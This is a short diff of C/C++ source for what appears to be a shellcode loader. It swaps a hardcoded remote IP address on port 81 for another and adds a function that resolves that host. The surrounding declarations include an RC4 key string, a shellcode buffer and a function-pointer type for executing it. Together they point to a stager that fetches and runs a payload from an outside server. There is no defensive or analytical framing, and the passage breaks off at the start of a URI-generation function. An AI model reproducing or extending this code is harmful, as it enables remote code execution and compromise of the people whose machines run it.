@@ -9,15 +9,40 @@
 #include <time.h>
 #include "rc4/ARC4.h"
 
-const char target[] = "192.3.176.232";
+const char target[] = "167.179.71.52";
+char * ip;
 const int  port = 81;
 const char obscure[] = "vtyuiaslkjfasfalsflkhlksadjlkgjlkdsajglkadnlkgsd";
 typedef void(__stdcall *CODE) ();
 char * shellcode = NULL;
 int shellcode_size = 0;
-
+struct in_addr addr;
 typedef PVOID(*M) (DWORD, DWORD, DWORD, DWORD);
 
+void GetIP() {
+	int ret;
+	WSADATA wsaData;
+	ret = WSAStartup(0x101, &wsaData);
+
+
+	if (ret != 0)
+	{
+		ip = (char *)target;
+		return;
+	}
+	hostent* host;
+	host = gethostbyname(target);
+	if (!host)
+	{
+		ip = (char *)target;
+
+		return;
+	}
+	addr.s_addr = *(unsigned long *)host->h_addr;
+	ip = inet_ntoa(addr);
+	WSACleanup();
+	return;
+}
 std::string GenerateUri()
 {
 	time_t myt = time(NULL);
